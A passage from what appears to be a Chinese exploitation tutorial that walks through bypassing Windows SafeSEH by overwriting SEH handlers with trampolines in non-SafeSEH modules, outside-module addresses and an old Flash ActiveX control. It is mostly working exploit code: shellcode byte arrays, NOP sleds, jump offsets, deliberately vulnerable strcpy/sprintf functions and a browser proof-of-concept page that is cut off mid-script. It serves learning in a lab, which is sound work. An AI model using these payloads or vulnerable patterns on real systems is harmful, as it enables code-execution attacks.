+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\xEB\x0E\x90\x90</span><span class=s>&#34;</span> <span class=c1>// 220 Byte NOP, retn here, jmp to shellcode
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=s>&#34;</span><span class=se>\x81\x11\x12\x11</span><span class=s>&#34;</span> <span class=c1>// address of pop pop retn in No_SafeSEH module
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span> <span class=c1>// to prevent SEH chain stack overfill
+</span></span></span><span class=line><span class=cl><span class=c1>// shellocode
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=s>&#34;</span><span class=se>\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x53\x68\x6B\x61\x6F\x6F\x68\x4D\x69\x73\x61\x8B\xC4\x53\x50\x50</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x53\xFF\x57\xFC\x53\xFF\x57\xF8</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>DWORD</span> <span class=nf>MyException</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>	<span class=n>printf</span><span class=p>(</span><span class=s>&#34;There is an exception&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=n>getchar</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=mi>1</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>test</span><span class=p>(</span><span class=kt>char</span><span class=o>*</span> <span class=n>input</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>	<span class=kt>char</span> <span class=n>str</span><span class=p>[</span><span class=mi>200</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>	<span class=n>strcpy</span><span class=p>(</span><span class=n>str</span><span class=p>,</span> <span class=n>input</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=kt>int</span> <span class=n>zero</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=c1>// prevent overfill, palce it to strcpy back
+</span></span></span><span class=line><span class=cl><span class=c1></span>
+</span></span><span class=line><span class=cl>	<span class=kr>__try</span>
+</span></span><span class=line><span class=cl>	<span class=p>{</span>
+</span></span><span class=line><span class=cl>		<span class=n>zero</span> <span class=o>=</span> <span class=mi>1</span> <span class=o>/</span> <span class=n>zero</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=p>}</span>
+</span></span><span class=line><span class=cl>	<span class=kr>__except</span><span class=p>(</span><span class=n>MyException</span><span class=p>()){}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>	<span class=n>HINSTANCE</span> <span class=n>hInst</span> <span class=o>=</span> <span class=n>LoadLibrary</span><span class=p>(</span><span class=n>TEXT</span><span class=p>(</span><span class=s>&#34;SEH_NOSafeSEH_JUMP.dll&#34;</span><span class=p>));</span> <span class=c1>// load No_SafeSEH module
+</span></span></span><span class=line><span class=cl><span class=c1></span>
+</span></span><span class=line><span class=cl>	<span class=kt>char</span> <span class=n>str</span><span class=p>[</span><span class=mi>200</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>	<span class=n>test</span><span class=p>(</span><span class=n>shellcode</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><h3 id=实验思路>实验思路</h3><ul><li>使用VC6编译SEH_NOSafeSEH_JUMP.DLL，这样SEH_NOSafeSEH_JUMP.DLL将不会启用SafeSEH，使用release模式</li><li>使用VS2008编译SEH_NOSafeSEH.EXE，这样SEH_NOSafeSEH.EXE将会启用SafeSEH，使用release模式，编译设置为无优化</li><li>SEH_NOSafeSEH.EXE的test函数存在明显的栈溢出漏洞，同样要求是shellcode中不能存在0</li><li>SEH被覆盖后，制造除0异常，劫持异常处理流程</li></ul><h3 id=提前处理>提前处理</h3><ul><li>由于<code>VC++ 6.0</code>编译的DLL默认加载基址为<code>0x10000000</code>，如果以它作为DLL的加载基址，DLL中<code>pop pop retn</code>指令地址中可能会包含<code>0x00</code>，这会在我们进行strcpy操作时会将字符串截断影响我们shellcode的复制，所以为了方便测试我们需要对基址进行重新设置。在顶部菜单中选择“工程→设置”，然后切换到“连接”选项卡，在“工程选项”的输入框中添加<code>/base:"0x11120000"</code>即可。</li></ul><h3 id=遇到的问题>遇到的问题</h3><ul><li>跳板将会跳到shellcode中地址的前方4字节处，所以应当将此处放入jmp</li><li>经过<code>VS 2008</code>编译的程序，在进入含有<code>__try{}</code>的函数时会在<code>Security Cookie+4</code>的位置压入<code>−2</code>(<code>VC++ 6.0</code>下为<code>−1</code>)，在程序进入<code>__try{}</code>区域时程序会根据该<code>__try{}</code>块在函数中的位置而修改成不同的值。例如，函数中有两个<code>__try{}</code>块，在进入第一个<code>__try{}</code>块时这个值会被修改成<code>0</code>，进入第二个的时候被修改为<code>1</code>。如果在<code>__try{}</code>块中出现了异常，程序会根据这个值调用相应的<code>__except()</code>处理，处理结束后这个位置的值会重新修改为<code>−2</code>;如里没有发生异常，程序在离开<code>__try{}</code>块时这个值也会被修改回<code>−2</code>。当然这个值在异常处理时还有其他用途。我们只需要知道由于它的存在，我们的 shellcode可能会被破坏，所以在模块地址之后应该放入八个字节的<code>NOP</code>作为保护措施。</li><li>从<code>retn</code>回栈地址空间到shellcode本体之间有四个字节的不和谐因素，因此我们需要跳转到shellcode中执行</li></ul><h2 id=利用加载模块以外的地址绕过safeseh>利用加载模块以外的地址绕过SafeSEH</h2><blockquote><p>所有的模块都默认开启了SafeSEH</p></blockquote><h3 id=跳板>跳板</h3><div class=table-wrapper><table><thead><tr><th>地址</th><th>反汇编代码</th></tr></thead><tbody><tr><td></td><td>call/jmpdword ptr[esp+0x8]</td></tr><tr><td></td><td>call/jmpdword ptr[esp+0x14]</td></tr><tr><td></td><td>call/jmpdword ptr[esp+0x1c]</td></tr><tr><td></td><td>call/jmpdword ptr[esp+0x2c]</td></tr><tr><td></td><td>call/jmpdword ptr[esp+0x44]</td></tr><tr><td></td><td>call/jmpdword ptr[esp+0x50]</td></tr><tr><td></td><td>call/jmp dword ptr[ebp+0xc]</td></tr><tr><td></td><td>call/jmp dword ptr[ebp+0x24]</td></tr><tr><td></td><td>call/jmp dword ptr[ebp+0x30]</td></tr><tr><td></td><td>call/jmp dword ptr[ebp-0x4]</td></tr><tr><td></td><td>call/jmp dword ptr[ebp-0xc]</td></tr><tr><td></td><td>call/jmp dword ptr[ebp-0x18]</td></tr></tbody></table></div><h3 id=代码-2>代码</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cpp data-lang=cpp><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;windows.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp></span>
+</span></span><span class=line><span class=cl><span class=kt>char</span> <span class=n>shellcode</span><span class=p>[]</span> <span class=o>=</span> 
+</span></span><span class=line><span class=cl><span class=c1>// shellcode start
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=s>&#34;</span><span class=se>\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x53\x68\x6B\x61\x6F\x6F\x68\x4D\x69\x73\x61\x8B\xC4\x53\x50\x50</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x53\xFF\x57\xFC\x53\xFF\x57\xF8</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=c1>// shellcode end
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span> <span class=c1>// will be overfile with 00000000 00000000 by {__try __catch}
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=s>&#34;</span><span class=se>\xE9\x2B\xFF\xFF\xFF\x90\x90\x90</span><span class=s>&#34;</span> <span class=c1>// far jump and nop
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=s>&#34;</span><span class=se>\xEB\xF6\x90\x90</span><span class=s>&#34;</span> <span class=c1>// short jump and nop &amp; return here
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=s>&#34;</span><span class=se>\x0B\x0B\x29\x00</span><span class=s>&#34;</span> <span class=c1>// address of call [ebp+30] in outside memory
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>DWORD</span> <span class=nf>MyException</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>	<span class=n>printf</span><span class=p>(</span><span class=s>&#34;There is an exception&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=n>getchar</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=mi>1</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>test</span><span class=p>(</span><span class=kt>char</span><span class=o>*</span> <span class=n>input</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>	<span class=kt>char</span> <span class=n>str</span><span class=p>[</span><span class=mi>200</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>	<span class=n>strcpy</span><span class=p>(</span><span class=n>str</span><span class=p>,</span> <span class=n>input</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=kt>int</span> <span class=n>zero</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>	<span class=kr>__try</span>
+</span></span><span class=line><span class=cl>	<span class=p>{</span>
+</span></span><span class=line><span class=cl>		<span class=n>zero</span> <span class=o>=</span> <span class=mi>1</span> <span class=o>/</span> <span class=n>zero</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=p>}</span>
+</span></span><span class=line><span class=cl>	<span class=kr>__except</span><span class=p>(</span><span class=n>MyException</span><span class=p>()){}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>	<span class=n>test</span><span class=p>(</span><span class=n>shellcode</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><h4 id=漏洞执行流程>漏洞执行流程</h4><ul><li>缓冲区溢出覆盖SEH链处理地址为模块外的地址绕过SafeSEH</li><li>在<code>0x00290B0B</code>处找到了一条<code>call [ebp+0x30]</code>的指令，使用它为跳板跳入shellcode</li></ul><h4 id=面临的问题>面临的问题</h4><ul><li><code>0x00290B0B</code>包含字节<code>0x00</code>，strcpy复制时遇到它将会终止</li></ul><blockquote><p>解决办法：00不能缺，就让它变成shellcode的末尾算了</p></blockquote><ul><li>和上一节一样的问题，经过<code>VS 2008</code>编译的程序，在进入含有<code>__try{}</code>的函数时会在<code>Security Cookie+4</code>的位置压入<code>−2</code>，它将会破坏shellcode，因此我们需要跳过它，它将会覆盖的位置代码中写入了，因此我们要使用它下方的12个字节跳转到真正shellcode的入口，因此要使用两次跳转跳到入口，第一次跳转是为了跳到长跳，第二次的长跳转是为了跳入shellcode</li></ul><h3 id=利用adobe-flash-player-activex控件绕过safeseh>利用Adobe Flash Player ActiveX控件绕过SafeSEH</h3><h4 id=原理>原理</h4><p>其实这种方法就是利用未启用<code>SafeSEH</code>模块绕过<code>SafeSEH</code>的浏览器版。Flash Player ActiveX 在<code>9.0.124</code>之前的版本不支持<code>SafeSEH</code>，所以如果我们能够在这个控件中找到合适的跳板地址，就完全可以绕过SafeSEH。</p><ul><li>Flash插件作为找跳板的模块，因为它未启用安全SEH</li><li>我们构造代码模块造成栈溢出漏洞</li><li>构造POC html页面调用我们构造的漏洞代码</li><li>我们的代码模块溢出覆盖SEH链后，将会跳入我们准备好的Flash代码跳板处</li><li>从Flash代码跳板处跳入我们栈区的shellcode</li><li>漏洞利用成功</li></ul><h4 id=代码-3>代码</h4><ul><li>下载<a class=link href=https://pan.moeomu.com/Tutorial/0Day%e5%ae%89%e5%85%a8-%e8%b5%84%e6%96%99/IE7-WindowsXP-x86-chs.exe target=_blank rel=noopener>IE7-for-XP-x86-中文</a>安装包</li><li>下载<a class=link href=https://pan.moeomu.com/Tutorial/0Day%e5%ae%89%e5%85%a8-%e8%b5%84%e6%96%99/flashplayer9r124_winax.exe target=_blank rel=noopener>Flash Player ActiveX <code>v9.0.124</code></a>安装包</li><li>创建一个MFC ActiveX控件，我将我创建的工程打包了一份，在此<a class=link href=https://pan.moeomu.com/Tutorial/0Day%e5%ae%89%e5%85%a8-%e8%b5%84%e6%96%99/VulnerAX_SEH/VulnerAX_SEH_SRC.zip target=_blank rel=noopener>下载</a></li><li>详细设置图</li></ul><p><img src=https://s3.ax1x.com/2020/11/12/BzaLDA.png loading=lazy alt=BzaLDA.png></p><ul><li>使用Unicode字符集，禁用编译优化选项，在静态库中使用MFC，使用release版本编译</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cpp data-lang=cpp><span class=line><span class=cl><span class=kt>void</span> <span class=n>CVulnerAX_SEHCtrl</span><span class=o>::</span><span class=n>test</span><span class=p>(</span><span class=n>LPCTSTR</span> <span class=n>str</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>	<span class=c1>//AFX_MANAGE_STATE(AfxGetStaticModuleState());
+</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=c1>// TODO: 在此添加调度处理程序代码
+</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=n>printf</span><span class=p>(</span><span class=s>&#34;moeomu&#34;</span><span class=p>);</span> <span class=c1>//定位该函数的标记
+</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=kt>char</span> <span class=n>dest</span><span class=p>[</span><span class=mi>100</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>	<span class=n>sprintf</span><span class=p>(</span><span class=n>dest</span><span class=p>,</span> <span class=s>&#34;%s&#34;</span><span class=p>,</span> <span class=n>str</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><ul><li><code>VulnerAX_SEH.idl</code>中<code>CVulnerAX_SEHCtrl的类信息</code>的UUID：<code>ACA3927C-6BD1-4B4E-8697-72481279AAEC</code></li></ul><h4 id=其它步骤>其它步骤</h4><ul><li>注册控件：<code>Regsvr32 路径\控件名.ocx</code></li><li>注册好后我们可以在web页面中以如下方式调用我们的函数</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>object</span> <span class=na>classid</span><span class=o>=</span><span class=s>&#34;clsid:ACA3927C-6BD1-4B4E-8697-72481279AAEC&#34;</span> <span class=na>id</span><span class=o>=</span><span class=s>&#34;test&#34;</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>object</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>	<span class=nx>test</span><span class=p>.</span><span class=nx>test</span><span class=p>(</span><span class=s2>&#34;testest&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
+</span></span></code></pre></td></tr></table></div></div><h4 id=触发漏洞>触发漏洞</h4><h5 id=构造poc页面>构造POC页面</h5><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>object</span> <span class=na>classid</span><span class=o>=</span><span class=s>&#34;clsid:D27CDB6E-AE6D-11cf-96B8-444553540000&#34;</span> <span class=na>codebase</span><span class=o>=</span><span class=s>&#34;http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=9,0,28,0&#34;</span> <span class=na>width</span><span class=o>=</span><span class=s>&#34;160&#34;</span> <span class=na>height</span><span class=o>=</span><span class=s>&#34;260&#34;</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>param</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;movie&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;1.swf&#34;</span> <span class=p>/&gt;</span>
+</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>param</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;quality&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;high&#34;</span> <span class=p>/&gt;</span>
+</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>embed</span> <span class=na>src</span><span class=o>=</span><span class=s>&#34;1.swf&#34;</span> <span class=na>quality</span><span class=o>=</span><span class=s>&#34;high&#34;</span> <span class=na>pluginspage</span><span class=o>=</span><span class=s>&#34;http://www.adobe.com/shockwave/download/download.cgi?P1_Prod_Version=ShockwaveFlash&#34;</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;application/x-shockwave-flash&#34;</span> <span class=na>width</span><span class=o>=</span><span class=s>&#34;160&#34;</span> <span class=na>height</span><span class=o>=</span><span class=s>&#34;260&#34;</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>embed</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>object</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>object</span> <span class=na>classid</span><span class=o>=</span><span class=s>&#34;clsid:ACA3927C-6BD1-4B4E-8697-72481279AAEC&#34;</span> <span class=na>id</span><span class=o>=</span><span class=s>&#34;test&#34;</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>object</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>	<span class=kd>var</span> <span class=nx>shellcode</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=kd>var</span> <span class=nx>s</span> <span class=o>=</span> <span class=s2>&#34;\u9090&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=k>while</span> <span class=p>(</span><span class=nx>s</span><span class=p>.</span><span class=nx>length</span> <span class=o>&lt;</span> <span class=mi>54</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>	<span class=p>{</span>
+</span></span><span class=line><span class=cl>		<span class=nx>s</span> <span class=o>+=</span> <span class=s2>&#34;\u9090&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=p>}</span>
+</span></span><span class=line><span class=cl>	<span class=nx>s</span> <span class=o>+=</span> <span class=s2>&#34;\u3001\u3008&#34;</span><span class=p>;</span>
